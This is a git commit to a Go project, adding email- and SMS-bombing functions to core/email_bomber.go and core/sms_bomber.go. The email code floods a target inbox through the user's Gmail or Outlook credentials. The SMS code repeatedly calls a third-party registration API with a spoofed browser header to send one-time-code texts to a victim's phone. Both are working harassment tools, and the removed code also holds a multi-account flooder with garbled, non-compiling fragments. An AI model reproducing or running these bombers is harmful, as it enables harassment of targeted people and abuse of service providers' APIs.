5e165eafd07afd8827bb25f3a47be53a5ca7e00e
kenjitheman <kenjitheman@proton.me>
2023-08-13 18:42:56 +0300

    feat: bomb logic implemented (email, sms)

--- core/email_bomber.go
+++ core/email_bomber.go
@@ -3,111 +3,80 @@ package core
 import (
 	"fmt"
 	"net/smtp"
-	"os"
 	"strings"
 	"sync"
 	"time"
 )
 
-var (
-	r     = "0"
-	r2    = "0"
-	todo  = 0
-	started = 0
-	lock  sync.Mutex
-)
+func sendEmail(
+	email, password, smtpServer, bombEmail, message string,
+	wg *sync.WaitGroup,
+	ch chan<- int,
+) {
+	defer wg.Done()
 
-var accounts = []string{}
-
-func stat() {
-	if os == "windows" {
+	auth := smtp.PlainAuth("", email, password, smtpServer)
+	err := smtp.SendMail(smtpServer+":587", auth, email, []string{bombEmail}, []byte(message))
+	if err != nil {
+		fmt.Println("[ERROR]:", err)
+		ch <- 0
+		return
 	}
 
-	if started == todo {
-		lock.Lock()
-		defer lock.Unlock()
-		fmt.Printf("[STATUS] SENT: %s FAILS: %s\n", r, r2)
-	}
+	ch <- 1
 }
 
-func emailThread(timeA int, targets []string, message, subject string) {
-	t := time.Now()
-	for time.Since(t).Seconds() < float64(timeA) {
-		for _, account := range accounts {
-			for _, target := range targets {
-				smtpServer := ""
-				switch {
-				case strings.Contains(account, "@yahoo.com"):
-					smtpServer = "smtp.mail.yahoo.com"
-				case strings.Contains(account, "@mail.ru") || strings.Contains(account, "@bk.ru") ||
-					strings.Contains(account, "@inbox.ru") || strings.Contains(account, "@list.ru") ||
-					strings.Contains(account, "@internet.ru") || strings.Contains(account, "@payeerbox.ru"):
-					smtpServer = "smtp.mail.ru"
-				default:
-					smtpServer = "smtp.rambler.ru"
-				}
+func EmailBomb() {
+	var bombEmail, email, password, message, serviceProvider string
+	var counter int
 
-				line := strings.Split(account, ":")
-				fromEmail := line[0]
-				fromPas := line[1]
+	fmt.Print("enter email address who you wanna attack: ")
+	fmt.Scan(&bombEmail)
+	fmt.Print("enter your gmail or outlook address: ")
+	fmt.Scan(&email)
+	fmt.Print("enter your gmail or outlook password: ")
+	fmt.Scan(&password)
+	fmt.Print("enter message: ")
+	fmt.Scan(&message)
+	fmt.Print("how many messages you wanna send?: ")
+	fmt.Scan(&counter)
 
-				auth := smtp.PlainAuth("", fromEmail, fromPas, smtpServer)
-				msg := []byte("To: " + target + "\r\n" +
-					"Subject: " + subject + "\r\n" +
-					"\r\n" +
-					message + "\r\n")
-				err := smtp.SendMail(smtpServer+":587", auth, fromEmail, []string{target}, msg)
-				if err != nil {
-					r2 = fmt.Sprintf("%d", (int(r2) + 1))
-					stat()
-				} else {
-					r = fmt.Sprintf("%d", (int(r) + 1))
-					stat()
-				}
-			}
-		}
+	fmt.Print("select the service provider (Gmail / Outlook): ")
+	fmt.Scan(&serviceProvider)
+	serviceProvider = strings.ToLower(serviceProvider)
+
+	var smtpServer string
+	if serviceProvider == "gmail" {
+		smtpServer = "smtp.gmail.com"
+	} else if serviceProvider == "outlook" {
+		smtpServer = "smtp.office365.com"
 	}
-}
-
-func emailStart() {
-	var text, text2, text3, text4 string
-
-	if os == "windows" {
-	} else {
-	}
-
-	fmt.Println(text2)
-
-	fmt.Print("email(s) for the attack > ")
-	var emails string
-	fmt.Scan(&emails)
-	emails = strings.ReplaceAll(emails, " ", "")
-	emailList := strings.Split(emails, ",")
-	fmt.Print("message to send > ")
-	var mes string
-	fmt.Scan(&mes)
-	fmt.Print("message subject > ")
-	var subject string
-	fmt.Scan(&subject)
-
-	fmt.Print(text2) 
-	fmt.Print(text3)
-
-	var todo, timeAttack int
-	fmt.Print(text)
-	fmt.Scan(&todo)
-	fmt.Print(text2)
-	fmt.Scan(&timeAttack)
 
 	var wg sync.WaitGroup
-	for i := 0; i < todo; i++ {
+	ch := make(chan int, counter)
+
+	for x := 0; x < counter; x++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			emailThread(timeAttack, emailList, mes, subject)
-			started++
-			fmt.Printf("[%d] %s\n", started, text3)
-		}()
+		go sendEmail(email, password, smtpServer, bombEmail, message, &wg, ch)
+		time.Sleep(1 * time.Second)
 	}
-	wg.Wait()
+
+	go func() {
+		wg.Wait()
+		close(ch)
+	}()
+
+	successCount := 0
+	errorCount := 0
+
+	for result := range ch {
+		if result == 1 {
+			successCount++
+		} else {
+			errorCount++
+		}
+	}
+
+	fmt.Printf("total emails sent: %d\n", successCount)
+	fmt.Printf("total errors: %d\n", errorCount)
 }
--- core/sms_bomber.go
+++ core/sms_bomber.go
@@ -1,9 +1,80 @@
 package core
 
 import (
-
+	"fmt"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"time"
 )
 
-func SmsBomb() {
+func clearScreen() {
+	cmd := exec.Command("clear")
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "cls")
+	}
 
+	cmd.Stdout = os.Stdout
+	cmd.Run()
+}
+
+func start(num string, counter, slep int) {
+	url := "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
+	hdr := http.Header{
+		"User-Agent": []string{
+			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+		},
+		"Accept": []string{
+			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		},
+		"Accept-Charset":  []string{"ISO-8859-1,utf-8;q=0.7,*;q=0.3"},
+		"Accept-Encoding": []string{"none"},
+		"Accept-Language": []string{"en-US,en;q=0.8"},
+		"Connection":      []string{"keep-alive"},
+	}
+	resultURL := url + num
+	client := http.Client{}
+	req, err := http.NewRequest("GET", resultURL, nil)
+	if err != nil {
+		fmt.Println("[ERROR] ", err)
+		return
+	}
+	req.Header = hdr
+	for x := 0; x < counter; x++ {
+		clearScreen()
+		page, err := client.Do(req)
+		if err != nil {
+			fmt.Println("[ERROR] ", err)
+			return
+		}
+		defer page.Body.Close()
+		time.Sleep(time.Duration(slep) * time.Second)
+	}
+}
+
+func SmsBomb() {
+	var number, count, throttle string
+
+	fmt.Print("enter mobile_number: ")
+	fmt.Scan(&number)
+	fmt.Print("enter number of messages: ")
+	fmt.Scan(&count)
+	fmt.Print("enter interval (seconds): ")
+	fmt.Scan(&throttle)
+
+	countInt, err := strconv.Atoi(count)
+	if err != nil {
+		fmt.Println("[ERROR] invalid number of messages: ", err)
+		return
+	}
+
+	throttleInt, err := strconv.Atoi(throttle)
+	if err != nil {
+		fmt.Println("[ERROR] invalid interval: ", err)
+		return
+	}
+
+	start(number, countInt, throttleInt)
 }
